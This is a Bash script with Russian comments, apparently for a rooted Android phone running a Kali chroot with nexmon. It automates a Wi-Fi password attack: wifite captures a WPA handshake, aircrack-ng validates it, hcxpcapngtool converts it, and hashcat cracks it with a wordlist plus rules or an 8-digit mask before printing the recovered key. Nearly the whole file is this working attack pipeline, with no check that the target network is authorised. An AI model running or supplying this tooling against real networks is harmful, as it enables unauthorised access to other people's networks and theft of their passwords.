#!/bin/bash
# auto_wifite.sh — Wifite -> конвертация -> hashcat
# Запускается из Android-части (monitor_and_run.sh) или вручную в chroot.
# Использование:
#   bash /root/auto_wifite.sh                     # полный цикл (только .cap этой сессии)
#   bash /root/auto_wifite.sh -c                  # брутфорс последнего .cap (с подтверждением)
#   bash /root/auto_wifite.sh -c -s               # интерактивный выбор .cap
#   bash /root/auto_wifite.sh -c /path/file.cap   # конкретный файл
#   bash /root/auto_wifite.sh -l                  # список .cap
#   bash /root/auto_wifite.sh -i                  # установить зависимости
#   bash /root/auto_wifite.sh -c -w /path/wordlist
#   bash /root/auto_wifite.sh -c -m               # маска (8 цифр)
#   bash /root/auto_wifite.sh -v                  # подробный отладочный вывод

set -euo pipefail

# ---------- Константы ----------
CRACK_ONLY=false
SPECIFIC_CAP=""
DO_INSTALL=false
USE_MASK=false
VERBOSE=false
SELECT_MODE=false
HS_DIR="/root/hs"
WORDLIST="${WORDLIST:-/usr/share/wordlists/wifi-wordlist.txt}"
RULES="/usr/share/john/rules/best64.rule"
LOG_FILE="$HS_DIR/auto_wifite.log"
SESSION_START=""

# ---------- Логирование ----------
mkdir -p "$HS_DIR"
log()  { echo "[*] $*" | tee -a "$LOG_FILE"; }
warn() { echo "[!] $*" | tee -a "$LOG_FILE" >&2; }
err()  { echo "[!] $*" | tee -a "$LOG_FILE" >&2; }

# ---------- Очистка при выходе ----------
cleanup() {
    local exit_code=$?
    unset LD_PRELOAD 2>/dev/null || true
    # Wi-Fi обычно восстанавливает внешняя Android-часть,
    # но если скрипт запущен вручную в chroot — страхуемся.
    if [ "$CRACK_ONLY" = false ]; then
        log "Возвращаю Wi-Fi в нормальный режим..."
        su -c "nexutil -m0" 2>/dev/null || true
        su -c "svc wifi enable" 2>/dev/null || true
    fi
    log "Скрипт завершён с кодом $exit_code"
    exit "$exit_code"
}
trap cleanup EXIT

# ---------- Разбор аргументов ----------
while [ $# -gt 0 ]; do
    case "$1" in
        -c|--crack-only) CRACK_ONLY=true; shift ;;
        -i|--install)    DO_INSTALL=true; shift ;;
        -s|--select)     SELECT_MODE=true; shift ;;
        -l|--list)
            echo "[*] Файлы .cap в $HS_DIR (новые сверху):"
            ls -lt "$HS_DIR"/*.cap 2>/dev/null || echo "    (нет файлов)"
            exit 0
            ;;
        -w|--wordlist)   WORDLIST="$2"; shift 2 ;;
        -m|--mask)       USE_MASK=true; shift ;;
        -v|--verbose)    VERBOSE=true; shift ;;
        -h|--help)
            cat <<EOF
Использование:
  $0                     # полный цикл (только .cap этой сессии)
  $0 -c                  # брутфорс последнего .cap (с подтверждением)
  $0 -c -s               # интерактивный выбор .cap
  $0 -c /path/file.cap   # брутфорс конкретного файла
  $0 -l                  # список .cap
  $0 -i                  # установить зависимости
  $0 -c -w /path/wordlist
  $0 -c -m               # маска (8 цифр)
  $0 -v                  # подробный вывод
EOF
            exit 0
            ;;
        *)
            if [ -f "$1" ]; then
                SPECIFIC_CAP="$1"
            else
                warn "Неизвестный аргумент: $1"
            fi
            shift
            ;;
    esac
done

# ---------- Установка зависимостей ----------
if [ "$DO_INSTALL" = true ]; then
    log "Устанавливаю зависимости..."
    apt update && apt install -y wifite hcxtools hashcat aircrack-ng
    log "Готово."
    exit 0
fi

# ---------- Проверка зависимостей ----------
check_deps() {
    local missing=()
    for cmd in hashcat hcxpcapngtool aircrack-ng; do
        command -v "$cmd" >/dev/null 2>&1 || missing+=("$cmd")
    done
    if [ "$CRACK_ONLY" = false ]; then
        command -v wifite >/dev/null 2>&1 || missing+=("wifite")
    fi
    if [ ${#missing[@]} -gt 0 ]; then
        err "Отсутствуют зависимости: ${missing[*]}"
        err "Запустите: $0 -i"
        exit 1
    fi
}
check_deps

# ---------- Этап 1: захват ----------
if [ "$CRACK_ONLY" = false ]; then
    SESSION_START=$(date +%s)
    export LD_PRELOAD=/lib/libnexmonkali.so
    log "LD_PRELOAD=$LD_PRELOAD"

    cd "$HS_DIR"
    log "Запускаю Wifite. Выберите цель и дождитесь захвата."
    log "После захвата нажмите Ctrl+C — скрипт продолжит."
    sleep 3
    wifite -i wlan0 --no-pmkid --hs-dir "$HS_DIR" || true
fi

# ---------- Интерактивный выбор .cap ----------
select_cap_interactive() {
    local files=()
    while IFS= read -r f; do files+=("$f"); done < <(ls -t "$HS_DIR"/*.cap 2>/dev/null || true)

    if [ ${#files[@]} -eq 0 ]; then
        err "В $HS_DIR нет .cap файлов."
        exit 1
    fi

    echo "[*] Доступные .cap (новые сверху):"
    local i=1
    for f in "${files[@]}"; do
        printf "  %2d) %s  (%s)\n" "$i" "$(basename "$f")" "$(date -r "$f" '+%Y-%m-%d %H:%M')"
        i=$((i+1))
    done

    local choice
    while true; do
        printf "[?] Выберите номер (1-%d), 'q' для выхода: " "${#files[@]}"
        read -r choice
        [ "$choice" = "q" ] && exit 0
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#files[@]}" ]; then
            echo "${files[$((choice-1))]}"
            return 0
        fi
        warn "Некорректный ввод."
    done
}

# ---------- Определение .cap ----------
if [ -n "$SPECIFIC_CAP" ]; then
    CAP_FILE="$SPECIFIC_CAP"
    [ -f "$CAP_FILE" ] || { err "Файл не найден: $CAP_FILE"; exit 1; }
elif [ "$SELECT_MODE" = true ]; then
    CAP_FILE=$(select_cap_interactive)
elif [ "$CRACK_ONLY" = false ]; then
    # Полный цикл: только .cap этой сессии
    CAP_FILE=""
    while IFS= read -r f; do
        mtime=$(stat -c %Y "$f" 2>/dev/null || echo 0)
        if [ "$mtime" -ge "$SESSION_START" ]; then
            CAP_FILE="$f"
            break
        fi
    done < <(ls -t "$HS_DIR"/*.cap 2>/dev/null || true)

    if [ -z "$CAP_FILE" ]; then
        err "В этой сессии захват не удался: нет нового .cap."
        err "Старые файлы не трогаю. Если нужно — запустите: $0 -c -s"
        exit 1
    fi
    log "Файл этой сессии: $CAP_FILE"
else
    # -c без -s: самый свежий, но с подтверждением
    CAP_FILE=$(ls -t "$HS_DIR"/*.cap 2>/dev/null | head -n1 || true)
    if [ -z "$CAP_FILE" ]; then
        err "Не найдено .cap файлов в $HS_DIR."
        exit 1
    fi

    if [ -t 0 ]; then
        echo "[*] Будет использован: $(basename "$CAP_FILE") ($(date -r "$CAP_FILE" '+%Y-%m-%d %H:%M'))"
        printf "[?] Продолжить? [Y/n/q] "
        read -r ans
        case "${ans:-Y}" in
            [Nn]*) err "Отменено. Используйте -s для выбора или укажите путь."; exit 0 ;;
            [Qq]*) exit 0 ;;
        esac
    else
        log "Не-TTY: беру самый свежий без подтверждения: $CAP_FILE"
    fi
fi

log "Использую файл: $CAP_FILE"

# ---------- Проверка рукопожатия ----------
log "Проверяю рукопожатие через aircrack-ng..."
if ! aircrack-ng "$CAP_FILE" 2>&1 | grep -qE "[0-9]+ handshake"; then
    err "В файле нет валидного рукопожатия. Прерываю."
    exit 1
fi
log "Рукопожатие валидно."

# ---------- Конвертация ----------
HC22000_FILE="${CAP_FILE%.cap}.hc22000"
if [ ! -s "$HC22000_FILE" ]; then
    log "Конвертирую в $HC22000_FILE..."
    hcxpcapngtool -o "$HC22000_FILE" "$CAP_FILE" 2>/dev/null || true
fi
if [ ! -s "$HC22000_FILE" ]; then
    err "Файл .hc22000 пуст. Прерываю."
    exit 1
fi
log "Хеш готов: $HC22000_FILE"

# ---------- Брутфорс ----------
POTFILE="$HS_DIR/hashcat.potfile"

if [ "$USE_MASK" = true ]; then
    log "Атака по маске: 8 цифр (?d?d?d?d?d?d?d?d)"
    log "Ctrl+C для остановки. Продолжить: hashcat --session=wifi --restore"
    [ "$VERBOSE" = true ] && set -x
    hashcat -m 22000 -a 3 -O -w 3 \
        "$HC22000_FILE" \
        ?d?d?d?d?d?d?d?d \
        --session=wifi \
        --potfile-path="$POTFILE" \
        --status --status-timer=30 2>&1 | tee -a "$LOG_FILE" || true
    { set +x; } 2>/dev/null
else
    if [ ! -f "$WORDLIST" ]; then
        warn "Словарь не найден: $WORDLIST"
        for alt in /usr/share/wordlists/wifi-wordlist.txt \
                   /usr/share/wordlists/rockyou.txt \
                   /usr/share/dict/wordlist-probable.txt; do
            if [ -f "$alt" ]; then
                WORDLIST="$alt"
                log "Использую альтернативный словарь: $WORDLIST"
                break
            fi
        done
    fi
    if [ ! -f "$WORDLIST" ]; then
        err "Ни один словарь не найден. Укажите -w /path/wordlist"
        exit 1
    fi
    log "Словарь: $WORDLIST"

    RULES_ARG=""
    [ -f "$RULES" ] && RULES_ARG="-r $RULES"

    log "Запускаю hashcat. Ctrl+C для остановки."
    log "Продолжить позже: hashcat --session=wifi --restore"
    [ "$VERBOSE" = true ] && set -x
    hashcat -m 22000 -a 0 -O -w 3 \
        "$HC22000_FILE" "$WORDLIST" $RULES_ARG \
        --session=wifi \
        --potfile-path="$POTFILE" \
        --status --status-timer=30 2>&1 | tee -a "$LOG_FILE" || true
    { set +x; } 2>/dev/null
fi

# ---------- Показ результата ----------
log "=== РЕЗУЛЬТАТ ==="
hashcat -m 22000 "$HC22000_FILE" --potfile-path="$POTFILE" --show 2>&1 | tee -a "$LOG_FILE" || true

log "Готово."
